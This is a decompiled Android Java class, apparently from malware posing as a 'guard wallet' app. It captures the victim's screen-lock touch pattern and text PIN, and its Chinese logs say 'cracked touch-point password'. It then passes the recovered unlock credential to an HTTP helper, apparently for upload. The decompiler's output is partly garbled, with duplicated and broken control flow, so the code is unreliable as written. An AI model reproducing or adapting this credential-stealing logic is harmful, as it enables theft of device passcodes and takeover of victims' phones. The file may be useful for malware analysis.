package com.guard.wallet.plug;

import a1.AbstractC0026q;
import android.util.Log;
import com.guard.wallet.entity.Point;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.RespCipherStateVO;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.Serializable;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import p011n.C0404a;

/* renamed from: com.guard.wallet.plug.f */
/* loaded from: classes.dex */
public final class C0227f implements Serializable {

    /* renamed from: a */
    public ReqListenHelper f272a;

    /* renamed from: b */
    public final LinkedList f273b = new LinkedList();

    /* renamed from: c */
    public final LinkedList f274c = new LinkedList();

    /* JADX WARN: Code restructure failed: missing block: B:59:0x01f2, code lost:
    
        if (((r0 == null || r0.isEmpty()) ? false : true) != false) goto L67;
     */
    /* JADX WARN: Removed duplicated region for block: B:10:0x008e  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x01e4  */
    /* renamed from: a */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m456a() {
        ReqUnlockDeviceVO reqUnlockDeviceVO;
        LinkedList linkedList;
        ReqListenHelper reqListenHelper = this.f272a;
        LinkedList linkedList2 = this.f274c;
        if (reqListenHelper != null && !linkedList2.isEmpty()) {
            if (Objects.equals(this.f272a.getListenType(), 1)) {
                ReqUnlockDeviceVO reqUnlockDeviceVO2 = new ReqUnlockDeviceVO();
                reqUnlockDeviceVO2.setTouchCipher(new LinkedList());
                reqUnlockDeviceVO2.getTouchCipher().addAll(linkedList2);
                reqUnlockDeviceVO2.setCipherGradeCode("PASSWORD_QUALITY_TOUCH_POINTS");
                Log.d("com.guard.wallet.plug.f", "已破解触点密码:" + reqUnlockDeviceVO2);
                reqUnlockDeviceVO = reqUnlockDeviceVO2;
                linkedList2.clear();
                linkedList = this.f273b;
                if (!linkedList.isEmpty()) {
                    LinkedList linkedList3 = new LinkedList();
                    LinkedList linkedList4 = new LinkedList();
                    LinkedList linkedList5 = new LinkedList();
                    linkedList.removeIf(new C0223b(this, linkedList3, linkedList4, linkedList5, 1));
                    if (reqUnlockDeviceVO == null) {
                        reqUnlockDeviceVO = new ReqUnlockDeviceVO();
                    }
                    if (!linkedList4.isEmpty()) {
                        linkedList4.sort(new C0404a(1));
                        ReqUnlockDeviceVO m452h = C0224c.m452h(linkedList4);
                        if (m452h != null && !AbstractC0026q.m151B(m452h.getTextCipher())) {
                            Log.d("com.guard.wallet.plug.f", "按ID破解:" + m452h.getTextCipher());
                            reqUnlockDeviceVO.setCipherGradeCode(m452h.getCipherGradeCode());
                            reqUnlockDeviceVO.setTextCipher(m452h.getTextCipher());
                        }
                    }
                    if (!linkedList3.isEmpty()) {
                        linkedList3.sort(new C0404a(1));
                        ReqUnlockDeviceVO m453i = C0224c.m453i(linkedList3);
                        if (m453i != null && !AbstractC0026q.m151B(m453i.getTextCipher())) {
                            Log.d("com.guard.wallet.plug.f", "按文本破解:" + m453i.getTextCipher());
                            if (AbstractC0026q.m151B(reqUnlockDeviceVO.getCipherGradeCode())) {
                                reqUnlockDeviceVO.setCipherGradeCode(m453i.getCipherGradeCode());
                            }
                            if (AbstractC0026q.m151B(reqUnlockDeviceVO.getTextCipher()) || C0224c.m449e(reqUnlockDeviceVO.getTextCipher(), reqUnlockDeviceVO.getTextCipher())) {
                                reqUnlockDeviceVO.setTextCipher(m453i.getTextCipher());
                            }
                        }
                    }
                    if (!linkedList5.isEmpty()) {
                        linkedList5.sort(new C0404a(1));
                        ReqUnlockDeviceVO m452h2 = C0224c.m452h(linkedList5);
                        if (m452h2 != null && !AbstractC0026q.m151B(m452h2.getTextCipher())) {
                            Log.d("com.guard.wallet.plug.f", "按DESC破解:" + m452h2.getTextCipher());
                            if (AbstractC0026q.m151B(reqUnlockDeviceVO.getCipherGradeCode())) {
                                reqUnlockDeviceVO.setCipherGradeCode(m452h2.getCipherGradeCode());
                            }
                            if (AbstractC0026q.m151B(reqUnlockDeviceVO.getTextCipher()) || C0224c.m449e(reqUnlockDeviceVO.getTextCipher(), reqUnlockDeviceVO.getTextCipher())) {
                                reqUnlockDeviceVO.setTextCipher(m452h2.getTextCipher());
                            }
                        }
                    }
                    linkedList.clear();
                }
                if (Objects.equals(this.f272a.getListenType(), 1) && !AbstractC0026q.m151B(reqUnlockDeviceVO.getCipherGradeCode())) {
                    if (!C0224c.m448d(reqUnlockDeviceVO.getTextCipher())) {
                        List<Point> touchCipher = reqUnlockDeviceVO.getTouchCipher();
                    }
                    Log.d("com.guard.wallet.plug.f", "Lock Cipher:" + reqUnlockDeviceVO);
                    AbstractC0252h.m682C(reqUnlockDeviceVO);
                    AbstractC0207l.m414B(reqUnlockDeviceVO);
                }
                this.f272a = null;
            }
            RespCipherStateVO respCipherStateVO = new RespCipherStateVO();
            respCipherStateVO.setListenType(this.f272a.getListenType());
            respCipherStateVO.setListenId(this.f272a.getListenId());
            respCipherStateVO.setSubscribeId(this.f272a.getSubscribeId());
            respCipherStateVO.setCipherGradeCode("PASSWORD_QUALITY_TOUCH_POINTS");
            respCipherStateVO.setTouchCipher(new LinkedList());
            respCipherStateVO.getTouchCipher().addAll(linkedList2);
            AbstractC0207l.m415C(respCipherStateVO);
        }
        reqUnlockDeviceVO = null;
        linkedList2.clear();
        linkedList = this.f273b;
        if (!linkedList.isEmpty()) {
        }
        if (Objects.equals(this.f272a.getListenType(), 1)) {
            if (!C0224c.m448d(reqUnlockDeviceVO.getTextCipher())) {
            }
            Log.d("com.guard.wallet.plug.f", "Lock Cipher:" + reqUnlockDeviceVO);
            AbstractC0252h.m682C(reqUnlockDeviceVO);
            AbstractC0207l.m414B(reqUnlockDeviceVO);
        }
        this.f272a = null;
    }
}
